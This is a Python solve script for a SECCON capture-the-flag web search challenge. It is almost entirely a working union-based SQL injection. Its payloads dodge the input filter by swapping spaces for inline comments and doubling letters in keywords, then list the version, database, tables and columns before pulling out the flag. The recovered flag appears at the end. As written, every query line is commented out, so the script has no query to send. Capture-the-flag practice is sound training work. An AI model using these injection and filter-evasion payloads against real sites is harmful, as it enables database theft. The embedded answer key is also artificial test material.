import requests

url = "http://web-search.chal.seccon.jp/"

def bypass_filter(q):
	q = q.replace(" ", "/**/")
	return q

params = {}

# get version : 10.4.8-MariaDB-1:10.4.8+maria~bionic
#query = "g0pher' union select * from (select 3)a join (select @@version)b join (select 4)c#"


# get database : seccon_sqli
#query = "g0pher' union select * from (select 3)a join (select database())b join (select 4)c#"

# get tables : flag, articles
#query = "g0pher' union select * from (select table_name from infoorrmation_schema.tables')a join (select 3)b  join (select 5)c#"

# get culmn : flag=[piece], articles=[id, title, description, regerence, status]
#query = "g0pher' union select * from (select column_name from infoorrmation_schema.columns where table_name = 'articles')a join (select 3)b  join (select 5)c#"

# You_Win_Yeah}
#query = "g0pher' union select * from (select piece from flag)a join (select 3)b  join (select 5)c#"

# SECCON{Yeah_Sqli_Success_
#query = "g0pher' union select * from (select description from articles)a join (select 3)b  join (select 5)c#"

params['q']= bypass_filter(query)
res = requests.get(url, params = params)
if "Err" in res.text:
	print("Error")
else:
	print(res.text)
print(params['q'])

# SECCON{Yeah_Sqli_Success_You_Win_Yeah}